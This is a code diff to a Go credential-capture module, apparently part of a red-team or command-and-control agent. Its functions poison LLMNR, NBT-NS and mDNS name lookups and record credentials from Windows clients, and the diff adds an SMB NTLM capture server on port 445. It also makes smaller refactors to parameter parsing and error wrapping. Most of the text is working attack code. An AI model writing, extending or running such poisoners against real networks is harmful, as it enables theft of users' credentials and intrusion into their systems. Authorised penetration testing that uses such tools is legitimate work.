@@ -14,9 +14,9 @@ import (
 // executePoisonCore runs the LLMNR/NBT-NS/mDNS poisoner with HTTP NTLM capture.
 // This is the cross-platform core logic called by platform-specific executePoison.
 func executePoisonCore(task structs.Task) structs.CommandResult {
-	var params sniffParams
-	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	params, parseErr := requireParams[sniffParams](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	duration := params.Duration
@@ -104,6 +104,18 @@ func executePoisonCore(task structs.Task) structs.CommandResult {
 		}
 	}()
 
+	// Start SMB NTLM capture server — Windows clients try SMB (port 445)
+	// before HTTP for UNC paths and file share access
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		if err := captureSMBNTLM(ctx, ":445", &mu, result); err != nil {
+			mu.Lock()
+			result.Errors = append(result.Errors, fmt.Sprintf("SMB-NTLM: %v", err))
+			mu.Unlock()
+		}
+	}()
+
 	wg.Wait()
 	result.Duration = fmt.Sprintf("%ds", duration)
 
@@ -116,7 +128,7 @@ func poisonLLMNR(ctx context.Context, responseIP net.IP, mu *sync.Mutex, result 
 	addr := &net.UDPAddr{IP: net.ParseIP(llmnrMulti), Port: llmnrPort}
 	conn, err := net.ListenMulticastUDP("udp4", nil, addr)
 	if err != nil {
-		return fmt.Errorf("bind LLMNR %s:%d: %v", llmnrMulti, llmnrPort, err)
+		return fmt.Errorf("bind LLMNR %s:%d: %w", llmnrMulti, llmnrPort, err)
 	}
 	defer conn.Close()
 
@@ -180,7 +192,7 @@ func poisonLLMNR(ctx context.Context, responseIP net.IP, mu *sync.Mutex, result 
 func poisonNBTNS(ctx context.Context, responseIP net.IP, mu *sync.Mutex, result *poisonResult) error {
 	conn, err := net.ListenPacket("udp4", fmt.Sprintf("0.0.0.0:%d", nbtnsPort))
 	if err != nil {
-		return fmt.Errorf("bind NBT-NS :%d: %v", nbtnsPort, err)
+		return fmt.Errorf("bind NBT-NS :%d: %w", nbtnsPort, err)
 	}
 	defer conn.Close()
 
@@ -220,12 +232,16 @@ func poisonNBTNS(ctx context.Context, responseIP net.IP, mu *sync.Mutex, result 
 
 		_, _ = conn.WriteTo(resp, remoteAddr)
 
+		udpAddr, ok := remoteAddr.(*net.UDPAddr)
+		if !ok {
+			continue
+		}
 		mu.Lock()
 		result.QueriesAnswered++
 		result.Credentials = append(result.Credentials, &sniffCredential{
 			Protocol:  "NBT-NS",
-			SrcIP:     remoteAddr.(*net.UDPAddr).IP.String(),
-			SrcPort:   uint16(remoteAddr.(*net.UDPAddr).Port),
+			SrcIP:     udpAddr.IP.String(),
+			SrcPort:   uint16(udpAddr.Port),
 			DstIP:     responseIP.String(),
 			DstPort:   nbtnsPort,
 			Username:  name,
@@ -241,7 +257,7 @@ func poisonMDNS(ctx context.Context, responseIP net.IP, mu *sync.Mutex, result *
 	addr := &net.UDPAddr{IP: net.ParseIP(mdnsMulti), Port: mdnsPort}
 	conn, err := net.ListenMulticastUDP("udp4", nil, addr)
 	if err != nil {
-		return fmt.Errorf("bind mDNS %s:%d: %v", mdnsMulti, mdnsPort, err)
+		return fmt.Errorf("bind mDNS %s:%d: %w", mdnsMulti, mdnsPort, err)
 	}
 	defer conn.Close()
 
